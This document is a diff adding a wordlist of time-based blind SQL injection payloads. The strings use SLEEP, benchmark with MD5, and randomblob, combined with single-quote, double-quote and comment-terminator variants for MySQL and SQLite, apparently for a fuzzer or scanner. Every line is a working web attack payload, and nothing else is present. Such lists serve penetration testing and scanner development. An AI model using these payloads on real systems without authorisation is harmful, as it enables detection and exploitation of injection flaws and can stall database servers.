@@ -1,0 +1,42 @@
+AND SLEEP(7)--+
+ AND SLEEP(7)#
+ AND SLEEP(7)-- -
+' AND SLEEP(7)--+
+' AND SLEEP(7)#
+' AND SLEEP(7)-- -
+" AND SLEEP(7)--+
+" AND SLEEP(7)#
+" AND SLEEP(7)-- -
+ AND benchmark(70000000,MD5(7))--+
+ AND benchmark(70000000,MD5(7))#
+ AND benchmark(70000000,MD5(7))-- -
+' AND benchmark(70000000,MD5(7))--+
+' AND benchmark(70000000,MD5(7))#
+' AND benchmark(70000000,MD5(7))-- - 
+" AND benchmark(70000000,MD5(7))--+
+" AND benchmark(70000000,MD5(7))#
+" AND benchmark(70000000,MD5(7))-- -
+ AND 1=randomblob(700000000)--
+' AND 1=randomblob(700000000)--
+" AND 1=randomblob(700000000)--
+ OR SLEEP(7)--+
+ OR SLEEP(7)#
+ OR SLEEP(7)-- -
+' OR SLEEP(7)--+
+' OR SLEEP(7)#
+' OR SLEEP(7)-- -
+" OR SLEEP(7)--+
+" OR SLEEP(7)#
+" OR SLEEP(7)-- -
+ OR benchmark(70000000,MD5(7))--+
+ OR benchmark(70000000,MD5(7))#
+ OR benchmark(70000000,MD5(7))-- -
+' OR benchmark(70000000,MD5(7))--+
+' OR benchmark(70000000,MD5(7))#
+' OR benchmark(70000000,MD5(7))-- - 
+" OR benchmark(70000000,MD5(7))--+
+" OR benchmark(70000000,MD5(7))#
+" OR benchmark(70000000,MD5(7))-- -
+ OR 1=randomblob(700000000)--
+' OR 1=randomblob(700000000)--
+" OR 1=randomblob(700000000)--
